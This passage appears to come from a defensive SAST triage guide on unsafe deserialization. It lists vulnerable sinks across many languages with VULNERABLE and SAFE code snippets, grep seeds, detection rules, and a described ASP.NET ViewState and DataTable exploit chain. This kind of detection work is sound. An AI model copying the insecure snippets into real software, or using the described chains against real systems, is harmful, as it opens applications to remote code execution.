- Jackson without `enableDefaultTyping` and without `@JsonTypeInfo(CLASS)` — safe default
- SnakeYAML 2.x default constructors or explicit `SafeConstructor`
- `ObjectInputStream` subclassed by `ValidatingObjectInputStream` on same flow
- Ruby/Python const-compare guards before decode
- HMAC/signature verified on same flow immediately before deserialize (secret not client-controlled)
- PHP `unserialize($data, ['allowed_classes' => false])` producing scalars/arrays only
- Python `yaml.safe_load` / `SafeLoader`; Node `JSON.parse` without `node-serialize`
- Protobuf/Avro/gRPC with fixed `.proto`/schema and no embedded type-name fields

## .NET Deserialization Vulnerable Patterns

### BinaryFormatter (CWE-502)

```csharp
// VULNERABLE: BinaryFormatter on user-controlled input
BinaryFormatter formatter = new BinaryFormatter();
object obj = formatter.Deserialize(Request.InputStream);

// VULNERABLE: LosFormatter (WebForms ViewState without MAC)
LosFormatter losFormatter = new LosFormatter();
object viewState = losFormatter.Deserialize(Request.Form["__VIEWSTATE"]);

// VULNERABLE: ObjectStateFormatter on posted ViewState (same chain as LosFormatter)
ObjectStateFormatter osf = new ObjectStateFormatter();
object state = osf.Deserialize(Request.Form["__VIEWSTATE"]);

// VULNERABLE: NetDataContractSerializer with untrusted input
NetDataContractSerializer serializer = new NetDataContractSerializer();
object obj = serializer.Deserialize(stream);
```

**.NET unsafe deserializers** (any of these on user-controlled input = CONFIRM):
- `BinaryFormatter`, `NetDataContractSerializer`, `SoapFormatter`
- `LosFormatter` (with ViewState MAC disabled)
- `ObjectStateFormatter` (without validation)

### ASP.NET ViewState Deserialization Chain (CWE-502)

Web Forms posts opaque state in `__VIEWSTATE`. When MAC or encryption is weakened, an attacker forges ViewState that deserializes into a gadget chain → **RCE**.

**Vulnerable conditions** (config + sink):
- `LosFormatter.Deserialize(Request.Form["__VIEWSTATE"])` or `ObjectStateFormatter.Deserialize(...)` in code-behind, handlers, or custom controls
- `enableViewStateMac="false"` on `<pages>` — disables integrity check on ViewState
- `ViewStateEncryptionMode="Never"` — ViewState not encrypted; pairs with MAC-off forgery
- Hardcoded `<machineKey validationKey="..." decryptionKey="..."/>` in committed `Web.config` — enables ViewState MAC forgery even when MAC is nominally on (cross-ref `aspnet_security_misconfig.md`, `weak_crypto_hash.md` / secrets handling)

**Exploit chain**: attacker obtains or derives `machineKey` → crafts signed ViewState blob with `BinaryFormatter`-compatible gadget → POST to any page with ViewState enabled → server deserializes via `LosFormatter`/`ObjectStateFormatter`.

```xml
<!-- VULN: MAC disabled — ViewState forgery without key when combined with LosFormatter sink -->
<pages enableViewStateMac="false" />

<!-- VULN: encryption off — aids tampering/replay analysis -->
<pages ViewStateEncryptionMode="Never" />

<!-- VULN: static keys in repo — deserialization enabler -->
<machineKey validationKey="..." decryptionKey="..." />
```

```csharp
// SAFE: rely on platform ViewState handling; never manual Deserialize on __VIEWSTATE
// SAFE: enableViewStateMac="true" (default), ViewStateEncryptionMode Auto/Always, machineKey from secure store
```

**Grep seeds** (Web.config / transforms / code-behind):
- `enableViewStateMac="false"`, `enableViewStateMac='false'`
- `ViewStateEncryptionMode="Never"`, `ViewStateEncryptionMode='Never'`
- `<machineKey`, `validationKey=`, `decryptionKey=`
- `LosFormatter`, `ObjectStateFormatter`, `Deserialize(Request.Form["__VIEWSTATE"])`, `Request.Form["__VIEWSTATE"]`

**.NET safe alternatives** — each holds **only if no member anywhere in the declared object graph has type `DataSet`, `DataTable`, `DataRow`, or a custom `IXmlSerializable`, and no member is typed `object`/`dynamic`**. A single such member re-opens polymorphic type resolution *inside* the graph and defeats the outer known-type constraint (see the next subsection):
- `DataContractSerializer` with known type list
- `XmlSerializer` with explicit known types
- `JsonSerializer` / `System.Text.Json` without TypeNameHandling

### `DataSet` / `DataTable` members defeat known-type serializers (CWE-502, CVE-2020-1147)

`System.Data.DataSet`, `DataTable`, and `DataRow` implement **`IXmlSerializable`**, so a known-type serializer does not parse them field-by-field — it hands the raw XML subtree to `DataTable.ReadXml`, which is **itself a polymorphic, type-resolving deserializer**. `ReadXml` honours an **embedded XSD schema** in the attacker's payload, and the schema's `msdata:DataType` column attribute names an **arbitrary .NET type** that gets instantiated and type-converted → gadget chain → RCE. Nothing about the outer `new XmlSerializer(typeof(KnownDto))` constrains this: the type allowlist applies to the *root* graph, while `ReadXml` performs its own unconstrained type lookup one level down. `DataSet` additionally carries a `RemotingFormat` property that can select `SerializationFormat.Binary`, smuggling a `BinaryFormatter` payload through an XML-looking document.

```csharp
// VULNERABLE: outer serializer is known-type and looks textbook-safe...
[XmlRoot("manifest")]
public class ImportManifest
{
    [XmlElement("name")] public string Name { get; set; }
    [XmlElement("rows")] public DataTable Rows { get; set; }   // <-- the sink is HERE, not at Deserialize()
}

private static readonly XmlSerializer S = new XmlSerializer(typeof(ImportManifest));  // "explicit known type"
var manifest = (ImportManifest)S.Deserialize(new StringReader(untrustedXml));         // RCE via <rows> XSD
```

Same defect through every serializer that reaches such a member: `XmlSerializer`, `DataContractSerializer`, `NetDataContractSerializer`, `BinaryFormatter`, `JsonConvert.DeserializeObject<DataTable>` / `<DataSet>` (Newtonsoft's `DataTableConverter`), and ASMX/WCF operations that accept a `DataSet`/`DataTable` parameter.

**Triage guard — do NOT clear this sink on known-type grounds.** These rationalizations are invalid and must not downgrade or suppress the finding: "the serializer is constructed with an explicit `typeof(T)`", "there is no `TypeNameHandling` / no `[XmlInclude]` / no type resolver", "the attacker can't choose the root type", "`DataTable` is part of the declared schema so it's a known type", or "this is at most DoS from a large table". The type allowlist and the `DataTable` member operate at different levels; the member is the vulnerability.

**SAFE**: parse into a plain DTO (`List<RowDto>`) and build the `DataTable` yourself from validated fields; never bind untrusted XML/JSON to `DataSet`/`DataTable`/`DataRow`. If a legacy wire format forces it, pre-validate the payload against a **pinned, server-side XSD** with schema inference disabled and confirm the `AppContext` switch `Switch.System.Data.AllowArbitraryDataSetTypeInstantiation` is **not** enabled — treat that switch being set to `true` anywhere in config as CONFIRM on its own.

### TypeNameHandling in JSON.NET (Newtonsoft.Json)

```csharp
// VULNERABLE: TypeNameHandling.All or TypeNameHandling.Auto
var settings = new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.All
};
var obj = JsonConvert.DeserializeObject(userInput, settings);

// SAFE: no TypeNameHandling, or TypeNameHandling.None (default)
var obj = JsonConvert.DeserializeObject<MyDto>(userInput);
```

## .NET TRUE POSITIVE Rules

- `BinaryFormatter.Deserialize(userStream)` — **CONFIRM** (RCE via .NET gadget chains)
- `JsonConvert.DeserializeObject` with `TypeNameHandling.All` or `TypeNameHandling.Auto` on user input — **CONFIRM**
- `LosFormatter.Deserialize(Request.Form["__VIEWSTATE"])` or `ObjectStateFormatter.Deserialize(Request.Form["__VIEWSTATE"])` when `enableViewStateMac="false"` or `ViewStateEncryptionMode="Never"` — **CONFIRM**
- Hardcoded `machineKey` `validationKey`/`decryptionKey` in committed config enabling ViewState forgery — **CONFIRM** as deserialization enabler (pair with ViewState/LosFormatter surface)
- `NetDataContractSerializer.Deserialize(stream)` with user-controlled stream — **CONFIRM**
- **Any** deserializer reaching a member declared `DataSet` / `DataTable` / `DataRow` from untrusted input — **CONFIRM** (RCE via embedded-XSD type instantiation; the outer serializer's known-type list does not apply — see the `DataSet`/`DataTable` subsection above)

## .NET FALSE POSITIVE Rules

Each rule below applies **only after** confirming no member in the declared graph is typed `DataSet`, `DataTable`, `DataRow`, `object`, `dynamic`, or a custom `IXmlSerializable`. Check the member types before applying any of them — a known-type root with one such member is a TRUE POSITIVE:

- `XmlSerializer` with explicit, fully-qualified known types and no `[XmlInclude]` wildcard on user input — generally safe
- `DataContractSerializer` with explicit `[KnownType]` list and no dynamic type resolution
- `JsonConvert.DeserializeObject<ExplicitType>(input)` with no `TypeNameHandling` setting (default = None) — safe for simple DTOs

## Python Deserialization Vulnerable Patterns

```python
# VULNERABLE: RCE via pickle gadgets
obj = pickle.loads(base64.b64decode(request.args['data']))

# VULNERABLE: YAML !!python/object tags
config = yaml.load(uploaded_yaml)

# VULNERABLE: ZeroMQ + pickle (ShadowMQ) — recv_pyobj() IS pickle.loads() over the wire;
# socket bound to all interfaces with no CURVE auth -> unauthenticated RCE on any frame.
# Note: no literal "pickle" appears at the sink, so token-only grep misses it.
sock.bind("tcp://*:5555")
req = sock.recv_pyobj()

# SAFE: data-only ZeroMQ framing + typed parse; no pickle on the wire; loopback / CURVE auth
sock.bind("tcp://127.0.0.1:5555")
req = MyRequest(**sock.recv_json())

# SAFE: data-only binding
data = yaml.safe_load(uploaded_yaml)
dto = json.loads(body, object_hook=lambda d: UserDto(**d))
```

**Python unsafe deserializers** (user/network/file input → CONFIRM):
- `pickle.load` / `pickle.loads` / `cPickle`, `dill.load`, `marshal.loads`
- `yaml.load` / `yaml.unsafe_load` / `yaml.full_load` without `Loader=SafeLoader`
- `jsonpickle.decode`, `torch.load` without `weights_only=True` (PyTorch ≥2.0)
- **msgpack-numpy**: `msgpack_numpy.patch()` globally installs its encoder/decoder, and `msgpack.unpack*`/`load*` with `object_hook=msgpack_numpy.decode` invokes `pickle.loads` when a crafted record declares NumPy object dtype (`kind == b'O'`). MessagePack is only the outer format; untrusted packed bytes still reach pickle. Encoding-only calls are not the sink.
- **pyzmq** `socket.recv_pyobj()` / `recv_serialized(pickle.loads)` (and any peer using `send_pyobj`) — ZeroMQ frames are deserialized via `pickle` **implicitly**, so there is **no literal `pickle.loads`/`torch.load` token in the source** to grep. RCE when the socket is reachable by an untrusted peer — bound to `tcp://*` / `0.0.0.0`, or with no CURVE/ZAP authentication (ZeroMQ has no auth by default). This is the **ShadowMQ** class that spread the same unsafe IPC across AI inference servers (vLLM, SGLang, Modular Max, and others) by **code reuse**. Also `Socket.recv(..., copy=...)` followed by `pickle.loads` on the frame.
- **Celery/Kombu broker messages** when worker `accept_content` includes `"pickle"` / `application/x-python-serialize` — the worker implicitly calls pickle while decoding a task, so no application-level `pickle.loads` or HTTP-to-sink flow is required. Treat **broker publish capability as the source**: confirm RCE when an untrusted tenant/service can publish, the Redis/RabbitMQ URL has no credentials, a shared broker/queue crosses trust boundaries, or publisher credentials are exposed. `task_serializer="pickle"` shows producers emit the format but is not the incoming gate by itself; `result_serializer="pickle"` concerns result encoding and is not proof that a worker accepts pickle tasks. If broker reachability/ACLs are unknown, report the unsafe acceptance as configuration exposure rather than inventing an HTTP source.

**Python secure-config indicators** (downgrade or FP):
- `yaml.safe_load` or `yaml.load(..., Loader=yaml.SafeLoader|BaseLoader)`
- `json.loads` / `orjson.loads` into dict or typed model only — no pickle/jsonpickle on path
- Explicit const/string guard before decode on same branch
- Plain `msgpack.unpack*` with no `msgpack_numpy.patch()` and no `msgpack_numpy.decode` hook
- ZeroMQ using `recv_json()` / `recv_string()` / `recv_multipart()` + typed parse (no `*_pyobj`), **or** a `*_pyobj` socket bound only to `127.0.0.1`/loopback / with CURVE (`socket.curve_server = True`) or ZAP authentication → downgrade the pyzmq sink
- Celery workers restricted to `accept_content=["json"]` (and `result_accept_content=["json"]` where results are consumed), with `task_serializer="json"` / `result_serializer="json"`; broker TLS, authentication, per-service credentials, vhost/queue ACLs, and network isolation are defense in depth, not a reason to keep pickle enabled

## PHP Deserialization Vulnerable Patterns

```php
// VULNERABLE: full object graph with arbitrary classes
$obj = unserialize($request->getContent());

// VULNERABLE: cookie/session blob without integrity check
$user = unserialize($_COOKIE['profile']);

// SAFE: JSON + validation
$dto = json_decode($input, true, 512, JSON_THROW_ON_ERROR);
validate_user_schema($dto);
```

**PHP unsafe sinks** (external input → CONFIRM):
- `unserialize()` on `$_POST`, `$_GET`, `$_COOKIE`, `$_SESSION`, file upload, or network body without `allowed_classes => false`
- `phar://` wrappers feeding `file_exists` / `include` that trigger Phar deserialization (related sink — trace to `unserialize` metadata)

**PHP secure-config indicators** (downgrade):
- `unserialize($data, ['allowed_classes' => false])` for scalar/array-only use
- `json_decode` with depth limit and schema validation; no `unserialize` on untrusted path

## Node.js Deserialization Vulnerable Patterns

```javascript
// VULNERABLE: node-serialize executes IIFE payloads
const cookie = require('cookie-parser');
const obj = require('node-serialize').unserialize(req.signedCookies.sess);

// VULNERABLE: js-yaml unsafe schema
const yaml = require('js-yaml');
const doc = yaml.load(userYaml, { schema: yaml.DEFAULT_FULL_SCHEMA });

// SAFE
const dto = JSON.parse(body);
const safe = yaml.load(userYaml);  // js-yaml v4+ safe by default
```

**Node.js unsafe sinks** (remote input → CONFIRM):
- `node-serialize` / `serialize-javascript` `.unserialize()` on cookies, headers, body
- `eval` / `new Function` / `vm.runInNewContext` parsing serialized strings
- `js-yaml` `load`/`loadAll` with `DEFAULT_FULL_SCHEMA` or custom types executing code

**Node.js secure-config indicators** (downgrade or FP):
- `JSON.parse` into plain object with manual field extraction
- `js-yaml` v4+ default `load` without unsafe schema override
- Signed/encrypted cookie (`cookie-parser` secret) verified before parse — still CONFIRM if `node-serialize` follows verify

## Secure Configuration Detection (SAST Triage)

Use to downgrade severity or suppress FP when config is co-located with sink (same function/file or injected bean):

| Language | Safe config tokens | Downgrade when |
|----------|-------------------|----------------|
| Java | `setObjectInputFilter`, `ObjectInputFilter.Config.createFilter`, `ValidatingObjectInputStream`, `SafeConstructor`, `ParserConfig.setSafeMode(true)`, `fastjson.parser.safeMode` in `fastjson.properties`, Fastjson `*_noneautotype` artifact, `PolymorphicTypeValidator`, `readValue(..., ConcreteDto.class)` | Filter/validator/DTO type visible on path to sink |
| Python | `safe_load`, `Loader=SafeLoader`, `json.loads`, `model_validate` | No pickle/yaml.load on untrusted branch |
| PHP | `allowed_classes => false`, `json_decode` + validator | No bare `unserialize` on request data |
| .NET | `TypeNameHandling.None`, `DeserializeObject<T>`, `DataContractSerializer(typeof(T))` | No BinaryFormatter/Auto/All on user stream |
| Node | `JSON.parse`, js-yaml default schema | No `node-serialize` / eval on request path |

**Missing safe config on untrusted path → maintain CONFIRM/LIKELY.**

## Analyst Notes

1. Check `pom.xml` / `build.gradle` for Fastjson version — any version < 2.0 with user input parsing is likely vulnerable
2. Even "internal" APIs may receive attacker-controlled input via SSRF or upstream injection
3. The `@type` field in Fastjson is the key indicator — if the application parses JSON containing `@type`, it's exploitable. On 1.2.83+, also treat remote `jar:http`/`jar:https` `@type` values and dense `/proc/self/fd` or `/dev/fd` sequences in the same array as high-confidence attack indicators (log/WAF correlation — not a substitute for flagging the code sink).
4. Flag `List<Object>` / `Object` / `Map<String,Object>` on Fastjson-bound request DTOs as nested `@type` carriers; grep for `setAutoTypeSupport(false)` without `setSafeMode(true)` — the former is not a downgrade signal.
5. For Jackson, grep for `enableDefaultTyping` and `@JsonTypeInfo` — these are the danger signals
6. SnakeYAML is commonly used in Spring Boot for config parsing — check if it also parses user-provided YAML
7. Chain deserialization with classpath analysis: having CommonsCollections/C3P0/Spring on classpath makes native Java deserialization instantly critical

## Unsafe Deserialization Detection

Commonly affected languages: Java, Python, JavaScript, Ruby, C#, Go.

**Java sinks modeled**: `ObjectInputStream.readObject`/`readUnshared`; Kryo, XStream, SnakeYAML, JYaml, JsonIO, YAMLBeans, Hessian/Burlap, Castor, Jackson (`enableDefaultTyping`), Fastjson, Gson gadgets, JMS `ObjectMessage`, `XMLDecoder.readObject`, `SerializationUtils.deserialize`, Jabsorb, Jodd, Flexjson; RMI deserialization; Spring HTTP invoker exporter in XML/configuration.

**Python sinks**: `pickle.load(s)`/`pickle.loads`, `cPickle`, `dill`, `marshal.loads`, `jsonpickle.decode`; `yaml.load`/`unsafe_load`/`full_load` without `SafeLoader`; `torch.load` (without `weights_only=True`); `numpy.load(..., allow_pickle=True)` / `np.fromfile`-then-`pickle` (an `.npy`/`.npz` with object arrays runs pickle on load — RCE on an untrusted model/data file); `pandas.read_pickle`; `joblib.load` (pickle-backed, common for sklearn models); `msgpack_numpy.patch()` or `object_hook=msgpack_numpy.decode` followed by MessagePack decode (object dtype → pickle); **pyzmq** `socket.recv_pyobj()` / `recv_serialized(pickle.loads)` (ZeroMQ frames → *implicit* `pickle.loads`; the **ShadowMQ** unauthenticated-RCE class when the socket is bound to an untrusted network or lacks CURVE auth — pervasive in AI inference servers); decoders where input may execute code.

**PHP sinks**: `unserialize()` on superglobals, cookies, sessions, uploads, network bodies; Phar metadata deserialization via `phar://` stream wrappers.

**JavaScript sinks**: `node-serialize`/`serialize-javascript` `.unserialize()`; `js-yaml` `load`/`loadAll` with unsafe schema (`DEFAULT_FULL_SCHEMA`, js-yaml-js-types); `eval`/`Function`/`vm.*` on serialized user strings.

**Ruby sinks**: `Marshal.load`, YAML `load` (Psych), Oj global options, Rails `:redis_cache_store` / `:mem_cache_store` default cache coders when an attacker can write chosen raw cache bytes, and Rails `action_dispatch.cookies_serializer = :marshal|:hybrid` when an attacker can mint a valid signed legacy cookie; YAML unsafe tags.

**C# sinks**: `BinaryFormatter`, `LosFormatter`, `NetDataContractSerializer`, `JavaScriptSerializer` + type resolver; untrusted stream → unsafe deserializer. Also **type-level** sinks that travel inside an otherwise known-type graph: a member declared `DataSet` / `DataTable` / `DataRow` (embedded-XSD type instantiation, CVE-2020-1147) reached by *any* serializer, including `XmlSerializer`/`DataContractSerializer` pinned to an explicit root type.

**Go sinks**: `encoding/gob` `gob.NewDecoder(...).Decode(...)` on attacker-controlled streams; third-party decoders that resolve concrete types from input (e.g. registered `gob` interface types, `mapstructure`/YAML into `interface{}`). Risk is generally lower than Java native deserialization (no broad gadget chains in the stdlib) — primary impact is DoS/panic and type confusion — but untrusted `gob` input should still be treated as a sink. Safe: decoding into a fixed concrete struct from a trusted source; `json.Unmarshal` into typed structs.

**OCaml sinks**: `Marshal.from_string` / `Marshal.from_bytes` / `Marshal.from_channel`, and `input_value` (the `Stdlib` wrapper over the same format) on attacker-controlled bytes. The OCaml marshal format is unauthenticated and unverified — unmarshalling violates type safety (a forged blob produces a value of an arbitrary claimed type), so a crafted payload causes memory corruption / crashes and can be leveraged for code execution. Safe: never unmarshal untrusted input; use a typed, validating parser (e.g. a `ppx`-derived JSON/`Sexp` decoder into a fixed type).

**Clojure sinks**: `(read-string s)` and `clojure.core/read` with the default `*read-eval*` true — reader macro `#=(...)` evaluates arbitrary Clojure/Java at read time → RCE. Safe: `(clojure.edn/read-string s)` / `clojure.edn/read` (no eval, no arbitrary tagged-literal execution), or bind `*read-eval*` to `false` (still prefer `edn`).

**Perl sinks**: `Storable::thaw` / `Storable::retrieve` (and `fd_retrieve`) on attacker-controlled bytes — Storable's own docs warn it is **not secure for untrusted data**: the unauthenticated binary format lets a forged blob instantiate arbitrary blessed objects whose `DESTROY`/overload methods then fire (object-injection → code execution), plus hash-flooding/resource abuse. Also `YAML::Load` (vs `YAML::XS` safe modes) and `eval`-based config loaders on request data. Safe: never `thaw`/`retrieve` untrusted input; use `JSON::PP`/`JSON::XS` decoding into plain data with schema validation.

**Sources**: remote/network input on all platforms.

**Sanitizers / barriers**:
- Java: `ObjectInputFilter` / `setObjectInputFilter`; `ValidatingObjectInputStream`, `SerialKiller`; XStream/Kryo whitelist configuration flows to read call; Jackson `PolymorphicTypeValidator` / `activateDefaultTyping` with validator; SnakeYAML `SafeConstructor`; Fastjson `ParserConfig.setSafeMode(true)`; HMAC/signature verify before `readObject`.
- Python: const-compare barriers; `yaml.safe_load` / `yaml.load(..., Loader=SafeLoader|BaseLoader)`; typed `json.loads` / pydantic `model_validate`; no pickle on untrusted path; ZeroMQ `recv_json`/`recv_multipart` + typed parse and CURVE/ZAP auth instead of `recv_pyobj`/`recv_serialized(pickle.loads)` on cross-trust sockets.
- PHP: `unserialize(..., ['allowed_classes' => false])`; `json_decode` with schema validation; HMAC on blob before decode.
- JS: `JSON.parse` only; default `js-yaml` v4+ without unsafe schema; no `node-serialize` on cookies/body.
- C#: no `TypeNameHandling` / no type resolver on `JavaScriptSerializer`; HMAC verify before `BinaryFormatter` (still prefer removal).

Remote input → deserialization API argument (unsafe-deserialization sink or decoder input where execution is possible).

Java additional config: tracks user-controlled `Class`/`type` passed to polymorphic deserializers (Jackson, etc.).

## Core Principle

Flag any path from remote input to a deserializer that can instantiate arbitrary types; prefer typed DTO binding and explicit allowlists over blocklists.
